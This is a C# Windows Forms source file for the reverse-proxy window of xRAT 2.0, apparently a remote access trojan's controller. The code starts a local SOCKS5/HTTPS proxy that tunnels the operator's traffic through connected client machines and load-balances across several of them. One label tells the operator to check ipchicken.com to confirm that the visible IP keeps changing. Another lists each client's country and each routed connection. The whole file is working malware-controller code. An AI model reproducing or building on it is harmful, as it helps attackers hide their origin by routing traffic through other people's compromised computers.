using System;
using System.Collections.Generic;
using System.Windows.Forms;
using xServer.Core;
using xServer.Core.ReverseProxy;

namespace xServer.Forms
{
    public partial class FrmReverseProxy : Form
    {
        private readonly Client[] clients;
        private ReverseProxyServer SocksServer { get; set; }
        private delegate void Invoky();
        private ReverseProxyClient[] OpenConnections;
        private Timer RefreshTimer;

        public FrmReverseProxy(Client[] clients)
        {
            InitializeComponent();
            this.clients = clients;

            for(int i = 0; i < clients.Length; i++)
                clients[i].Value.FrmProxy = this;
        }

        private void FrmReverseProxy_Load(object sender, EventArgs e)
        {
            if (clients.Length > 1)
            {
                this.Text = string.Format("xRAT 2.0 - Reverse Proxy [Load-Balancer is active]");

                lblLoadBalance.Text = "The Load Balancer is active, " + clients.Length + " clients will be used as proxy\r\nKeep refreshing at www.ipchicken.com to see if your ip address will keep changing, if so, it works";

            }
            else if (clients.Length == 1)
            {
                this.Text = string.Format("xRAT 2.0 - Reverse Proxy [{0}:{1}]", clients[0].EndPoint.Address.ToString(), clients[0].EndPoint.Port.ToString());

                lblLoadBalance.Text = "The Load Balancer is not active, only 1 client is used, select multiple clients to activate the load balancer";
            }
        }

        private void btnStart_Click(object sender, EventArgs e)
        {
            try
            {
                SocksServer = new ReverseProxyServer();
                SocksServer.OnConnectionEstablished += socksServer_onConnectionEstablished;
                SocksServer.OnUpdateConnection += socksServer_onUpdateConnection;
                SocksServer.StartServer(clients, "0.0.0.0", (int)nudServerPort.Value);
                btnStart.Enabled = false;
                btnStop.Enabled = true;

                RefreshTimer = new Timer();
                RefreshTimer.Tick += RefreshTimer_Tick;
                RefreshTimer.Interval = 100;
                RefreshTimer.Start();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                btnStop_Click(sender, null);
            }
        }

        void RefreshTimer_Tick(object sender, EventArgs e)
        {
            try
            {
                lock (SocksServer)
                {
                    this.OpenConnections = SocksServer.OpenConnections;
                    LvConnections.VirtualListSize = this.OpenConnections.Length;
                    LvConnections.Refresh();
                }
            }
            catch { }
        }

        void socksServer_onUpdateConnection(ReverseProxyClient proxyClient)
        {

        }

        void socksServer_onConnectionEstablished(ReverseProxyClient proxyClient)
        {

        }

        private string GetSizeStr(long size)
        {
            if (size > (1024 * 1024 * 1024))
                return (size / (1024 * 1024 * 1024)) + "GB";

            if (size > (1024 * 1024))
                return (size / (1024 * 1024)) + "MB";

            if (size > 1024)
                return (size / 1024) + "KB";

            return size + "B";
        }

        private void btnStop_Click(object sender, EventArgs e)
        {
            if (RefreshTimer != null)
                RefreshTimer.Stop();
            btnStart.Enabled = true;
            btnStop.Enabled = false;
            if (SocksServer != null)
                SocksServer.Stop();

            try
            {
                SocksServer.OnConnectionEstablished -= socksServer_onConnectionEstablished;
                SocksServer.OnUpdateConnection -= socksServer_onUpdateConnection;
            }
            catch { }
        }

        private void FrmReverseProxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            //Stop the proxy server if still active
            btnStop_Click(sender, null);

            for (int i = 0; i < clients.Length; i++)
            {
                if (clients[i].Value != null)
                    clients[i].Value.FrmProxy = null;
            }
        }

        private void nudServerPort_ValueChanged(object sender, EventArgs e)
        {
            lblProxyInfo.Text = string.Format("Connect to this SOCKS5/HTTPS Proxy: 127.0.0.1:{0} (no user/pass)", nudServerPort.Value);
        }

        private void LvConnections_RetrieveVirtualItem(object sender, RetrieveVirtualItemEventArgs e)
        {
            lock (SocksServer)
            {
                if (e.ItemIndex < OpenConnections.Length)
                {
                    ReverseProxyClient Connection = OpenConnections[e.ItemIndex];

                    e.Item = new ListViewItem(new string[]
                    {
                        Connection.Client.EndPoint.ToString(),
                        Connection.Client.Value.Country,
                        Connection.TargetServer + (Connection.HostName.Length > 0 ? "    (" + Connection.HostName + ")" : ""),
                        Connection.TargetPort.ToString(),
                        GetSizeStr(Connection.LengthReceived),
                        GetSizeStr(Connection.LengthSended),
                        Connection.Type.ToString()
                    }) { Tag = Connection };
                }
            }
        }

        private void killConnectionToolStripMenuItem_Click(object sender, EventArgs e)
        {
            lock (SocksServer)
            {
                if (LvConnections.SelectedIndices.Count > 0)
                {
                    //copy the list, it could happen the suddenly the items de-select
                    int[] items = new int[LvConnections.SelectedIndices.Count];
                    LvConnections.SelectedIndices.CopyTo(items, 0);

                    foreach (int index in items)
                    {
                        if (index < OpenConnections.Length)
                        {
                            ReverseProxyClient Connection = OpenConnections[index];
                            if (Connection != null)
                            {
                                Connection.Disconnect();
                            }
                        }
                    }
                }
            }
        }
    }
}
